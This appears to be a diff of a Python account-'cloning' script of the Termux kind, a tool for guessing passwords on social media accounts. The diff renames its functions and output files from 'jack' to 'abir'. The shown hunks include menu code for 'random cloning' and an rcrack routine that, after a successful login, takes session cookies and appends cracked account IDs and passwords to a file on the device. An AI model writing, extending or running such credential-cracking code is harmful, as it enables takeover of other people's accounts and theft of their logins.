@@ -235,19 +235,19 @@ def FD():
 
         os.system('xdg-open https://m.youtube.com/@DarkFixNet67Team')
 
-        jack()
+        abir()
 
         return None
 
     None('\n\x1b[1;97mEXIT\x1b[0;97m')
 
-def jack():
+def abir():
 
     os.system('clear')
 
     jalan(logo)
     
-    os.system('espeak -a 300 "ASSALAAAMUUU  AALAIKUMM । আমার  নাম   জ্যেক।    আমার  । টুলস  । ব্যবহার  করার  জন্য  স্বাগতম"')
+    os.system('espeak -a 300 "ASSALAAAMUUU  AALAIKUMM । আমার  নাম   জ্যেক।    আমার  । টুল  । ব্যবহার  করার  জন্য  স্বাগতম"')
     
 
     print("")
@@ -271,13 +271,13 @@ def jack():
     if opt == '1':
         os.system('espeak -a 300 "random cloning start"')
         time.sleep(0.5)
-        jack()
+        i()
 
         return None
 
     if opt == '3':
 
-        jack_sanjida()
+        abir_sanjida()
 
         return None
 
@@ -289,7 +289,7 @@ def jack():
 
     if opt == '2':
 
-        jack()
+        abir()
 
     if opt == '0':
 
@@ -663,7 +663,7 @@ def i():
     print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 #x = open('/sdcard/1ua.txt','r').read().splitlines()
-def jack_sanjida():
+def abir_sanjida():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -758,7 +758,7 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
                 print('\r\r\033[0;93m[jack-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
-                open('/sdcard/jack-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                open('/sdcard/ABIR-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:	
@@ -778,7 +778,7 @@ def separate():
     print(47*'-')
     if file_name == '':
         main_menu()
-    print ('\033[1;32mFor Example /sdcard/JK.txt\033[0;97m')
+    print ('\033[1;32mFor Example /sdcard/ABIR.txt\033[0;97m')
     print (47*'-')
     new_save = input('\033[1;37mSave New file Name: \033[0;97m')
     if "/sdcard/" not in new_save:
@@ -801,10 +801,10 @@ def separate():
     print('\033[1;32mNew file saved as: /sdcard/'+new_save)
     print(47*'-')
     input('\033[1;32mPress enter to back ')
-    jack()
+    abir()
 
 
 
-jack()
+abir()
 
  
